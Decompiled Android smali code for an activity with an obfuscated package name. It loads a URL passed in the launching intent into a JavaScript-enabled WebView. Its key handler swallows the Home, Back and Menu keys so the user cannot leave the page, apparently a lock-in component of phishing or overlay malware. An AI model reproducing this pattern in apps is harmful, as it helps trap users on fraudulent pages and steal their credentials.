.class public Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL;
.super Landroid/app/Activity;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$ifdf;,
        Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$for;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    return-void
.end method

.method public onDestroy()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .registers 4

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_5

    return p2

    :cond_5
    const/4 v0, 0x4

    if-ne p1, v0, :cond_9

    return p2

    :cond_9
    const/16 v0, 0x52

    if-ne p1, v0, :cond_e

    return p2

    :cond_e
    const/4 p1, 0x0

    return p1
.end method

.method protected onStart()V
    .registers 6

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "url"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_1c

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_43

    :cond_1c
    new-instance v1, Landroid/webkit/WebView;

    invoke-direct {v1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v3, Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$for;

    invoke-direct {v3, p0, v2}, Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$for;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL;Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$fddo;)V

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v3, Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$ifdf;

    invoke-direct {v3, p0, v2}, Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$ifdf;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL;Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL$fddo;)V

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    invoke-virtual {v1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    :cond_43
    return-void
.end method

.method protected onStop()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
